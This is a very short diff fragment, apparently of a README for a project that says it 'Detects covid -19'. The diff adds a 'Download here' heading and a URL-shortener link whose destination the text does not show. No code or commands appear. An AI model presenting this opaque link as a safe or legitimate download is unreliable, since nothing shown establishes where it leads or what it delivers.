@@ -2,6 +2,8 @@
 
 Detects covid -19
 
+# Download here
+https://rb.gy/oabwdl
 
 
 
